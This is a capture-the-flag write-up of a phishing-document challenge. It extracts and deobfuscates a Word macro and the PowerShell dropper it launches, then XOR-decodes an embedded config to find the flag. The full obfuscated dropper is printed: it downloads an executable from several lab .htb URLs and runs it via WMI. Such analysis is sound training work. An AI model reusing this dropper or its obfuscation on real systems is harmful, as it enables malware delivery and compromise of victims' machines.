> WearRansom ransomware just got loose in our company.
> The SOC has traced the initial access to a phishing attack, a Word document with macros.
> Take a look at the document and see if you can find anything else about the malware and perhaps a flag.

> Author: **[0xdf][author-profile]**

## The maldoc

The document macros can be extracted with:

```bash
olevba2 --deobf --decode emo.doc
```

This decodes the hex strings but the VBA code is still obfuscated:

```vba
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Private Sub Document_open()
Get4ipjzmjfvp.X8twf_cydt6
End Sub
Function X4al3i4glox(Gav481k8nh28)
X4al3i4glox = Replace(Gav481k8nh28, "][(s)]w", Sxybmdt069cn)
End Function
```

## Interpretation

The most efficient, most tempting, action is to just run the code.
But I'm on my Linux laptop, not powerful enough for a Windows VM.

So let's just try and make sense of the code.

The previous snippet is run at the opening of the document. It replaces the
string "][(s)]w" with the content of `Sxybmdt069cn`.

This last variable is undefined in the context of the root script. It may
actually mean that "][(s)]w" is supposed to be removed.

Looking around for "][(s)]w" with `strings -n8`, we find:

```
][(s)]w][(s)]wP][(s)]wO][(s)]ww][(s)]we][(s)]wr][(s)]ws][(s)]wh][(s)]we][(s)]wL][(s)]wL][(s)]w ][(s)]w-][(s)]ww][(s)]wi][(s)]wn][(s)]wd][(s)]wo][(s)]ww][(s)]ws][(s)]wt][(s)]wy][(s)]wl][(s)]we][(s)]w ][(s)]wh][(s)]wi][(s)]wd][(s)]wd][(s)]we][(s)]wn][(s)]w ][(s)]w-][(s)]wE][(s)]wN][(s)]wC][(s)]wO][(s)]wD][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]wIPA][(s)]wABY][(s)]wTKA][(s)]wYFz][(s)]wYXA][(s)]wpIy][(s)]wAdA][(s)]wxgD][(s)]wAfD][(s)]wLAr][(s)]wAVe][(s)]wDgG][(s)]wBuY][(s)]wtAH][(s)]wCyA][(s)]wwAY][(s)]wKTA
```

It looks like regular characters separated by our weird string.
Indeed! It translates to `POwersheLL -windowstyle hidden -ENCOD                 IPAABYTK...`, after removing "][(s)]w".

## Running in a sandbox

Running the malware in the online sandbox [any.run](https://any.run) immediately
captures the powershell command found above:

```powershell
POwersheLL -windowstyle hidden -ENCOD IABTAFYAIAAgADAAegBYACAAKABbAFQAeQBQAGUAXQAoACIAewAyAH0AewAwAH0Ae...
```

Still `any.run` shows file activity, but I found no way to open them.

## Decoding

Back to the code then!

The previous snippet is actually base64 encoded and gives:

```powershell
SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;   set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG')) ;  $Nbf5tg3=('B9'+'yp'+('90'+'s'));$Vxnlre0=$Cludkjx + [char](64) + $R6r1tuy;$Ky3q0e8=(('Rq'+'dx')+'wo'+'5');  (  Dir  vaRiAble:0Zx).valuE::"CreAT`E`dIREc`T`OrY"($HOME + ((('nDp'+'Jrb')+('e'+'vk4n')+'D'+'p'+('C'+'cwr_2h')+'nD'+'p') -RePlAcE ('n'+'Dp'),[cHaR]92));$FN5ggmsH = (182,187,229,146,231,177,151,149,166);$Pyozgeo=(('J5f'+'y1')+'c'+'c'); (  vaRiABLE TxYSEo  ).ValuE::"SecUrI`TYp`R`OtOc`ol" = (('Tl'+'s1')+'2');$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);$Huajgb0=(('Jn'+'o')+'5g'+'a1');$Bb28umo = (('Ale'+'7g')+'_8');$Hsce_js=('Kv'+('nb'+'ov_'));$Spk51ue=(('C'+'7xo')+'9g'+'l');$Scusbkj=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.e'+'x')+'e');$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);$hbmskV2T=(('C'+'7xo')+'9g'+'l');$hbmskV2T=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.c'+'o')+'nf');$Q1_y05_=('W'+('4'+'qvy')+'z8');$Odb3hf3=&('n'+'e'+'w-object') Net.WEBclIENt;$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);$Anbyt1y=('h'+('ttp:'+']['+'(s)]')+(('w]'+'[('))+(('s)'+']w'))+('da'+'-')+'i'+'n'+'du'+('s'+'trial.'+'h'+'t')+'b]'+('[(s)]'+'w'+'js')+((']'+'[('))+(('s'+')]w9IdL'+'P]['+'(s'+')]w'+'@h'))+('t'+'tp:]')+('[(s'+')]')+'w'+(']'+'[(s)]')+('wdap'+'ro'+'fesiona'+'l.h')+'tb'+('][(s'+')'+']')+'w'+('d'+'ata')+('4][(s'+')]wh')+('WgW'+'jT')+('V]'+'[')+('(s)]w@http'+'s:][(s'+')]'+'w'+']')+'['+('(s)'+']wdag'+'ra')+'ni'+'t'+('eg'+'ia')+('re.h'+'t')+'b]'+('['+'(s)')+(']ww'+'p-a'+'dm'+'in][(s)'+']wt')+('V]['+'(s'+')')+(']w@'+'h')+'tt'+'p'+(':'+'][')+('(s)]w]['+'(s'+')]www'+'w'+'.out'+'s'+'p')+('ok'+'e')+'nv'+'i'+('s'+'ions.')+('htb'+']')+'['+('(s)]w'+'wp'+'-in')+('clu'+'d')+('es][(s)'+']waW'+'o'+'M')+(']'+'[('+'s)]w')+('@'+'http:]')+('[(s)'+']w][('+'s)')+(']wmo'+'bs')+('o'+'uk.h')+(('t'+'b][('))+(('s)'+']wwp-'))+'in'+'c'+'l'+('ude'+'s]'+'[')+('(s)]'+'w')+('UY'+'30R]')+('[(s'+')]w'+'@'+'h'+'ttp:][')+('('+'s)]w')+(']['+'(s)')+(']'+'wb')+'i'+('g'+'laugh'+'s')+(('.h'+'t'+'b][(s'))+((')]'))+('ws'+'mallpot'+'ato')+'es'+((']'+'[(s'))+((')]wY]'+'[(s'+')]w'+'@h'+'ttps:][(s)'))+']w'+('][('+'s)]wn'+'g')+('ll'+'o')+('gist'+'i')+('cs.'+'h')+'t'+('b]'+'['+'('+'s)]w')+'ad'+('mi'+'n')+'er'+']'+('[(s'+')]w'+'W3m')+'k'+(('B'+'][(s'))+((')'+']w')))."rep`LAcE"((']'+'['+('(s)]'+'w')),([array]('/'),('xw'+'e'))[0])."sP`lIT"($Ivg3zcu + $Vxnlre0 + $Jzaewdy);$Gcoyvlv=(('Kf'+'_')+('9'+'et1'));foreach ($A8i3ke1 in $Anbyt1y){try{$Odb3hf3."dO`WnLOA`dfILe"($A8i3ke1, $Scusbkj);$Zhcnaux=(('Ek'+'k')+('j'+'47t'));If ((&('Get-I'+'te'+'m') $Scusbkj)."LEn`GTh" -ge 45199) {${A8`I`3KE1}.("{1}{2}{0}" -f'ay','ToCha','rArr').Invoke() | .("{2}{1}{0}{3}" -f'-','ach','ForE','Object') -process { ${FN5`GGm`Sh} += ([byte][char]${_} -bxor 0xdf ) }; $FN5ggmsH += (228); $b0Rje =  [type]("{1}{0}" -F'VerT','Con');   $B0RjE::"tO`BaS`E64S`TRI`Ng"(${fn5`ggm`sh}) | .("{2}{1}{0}" -f 'ile','ut-f','o') ${hB`mSK`V2T}; ([wmiclass](('wi'+'n')+('32_'+'Proc'+'e')+'s'+'s'))."cR`eaTE"($Scusbkj);$Glwki6a=('I'+'m'+('td'+'xv6'));break;$Pfpblh1=('Vs'+('lal'+'c')+'u')}}catch{}}$F47ief2=(('Bn'+'zid')+'rt')
```

Obfuscated, but this is a major step in readability!

## Deobfuscating

So I took it as a powershell learning exercise and cleaned line by line:

```powershell
SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;
Set-Variable 0zX ([Type]("System.IO.Directory"));
```

```powershell
set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG')) ;
Set-Variable TxySeo ([Type]("System.Net.ServicePointManager"));
```

Etc.

## Fast and failed

### Decoding str

There are many unused variables, that are constant strings.

```powershell
$Nbf5tg3=('B9'+'yp'+('90'+'s'));
$Nbf5tg3 = 'B9yp90s';
```

They may be here as an evasion / obfuscation tool or actually carry meaning.

I tried decoding as base64, but no luck.

### Replaying HTTP requests

The script tries to download data from these:

```
http://da-industrial.htb/js/9IdLP/
http://daprofesional.htb/data4/hWgWjTV/
https://dagranitegiare.htb/wp-admin/tV/
http://www.outspokenvisions.htb/wp-includes/aWoM/
http://mobsouk.htb/wp-includes/UY30R/
http://biglaughs.htb/smallpotatoes/Y/
https://ngllogistics.htb/adminer/W3mkB/
```

They don't resolve, even on the vpn.

### Running the script

I traced the script execution with `Set-PSDebug -Trace 2`, but only found commands I already knew and understood.

## Suspicious data

There's an array of integers, with byte like values:

```powershell
$FN5ggmsH = (182,187,229,146,231,177,151,149,166);
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);
```

In retrospective, the following command clearly shows that it was the key:

```powershell
${FN5GGmSh} += ([byte][char]${_} -bxor 0xdf
```

> thanks to the author for passing by! :D

The array is not directly interpretable as characters, but it can be unlocked with a judicious xor:

```python
print(bytes([b ^ 0xdf for b in bytes(a)]))
```

> `id:M8nHJyeR;int:3000;jit:500;flag:HTB{4n0th3R_d4Y_AnoThEr_pH1Sh};url:`

[author-profile]: https://app.hackthebox.com/users/4935
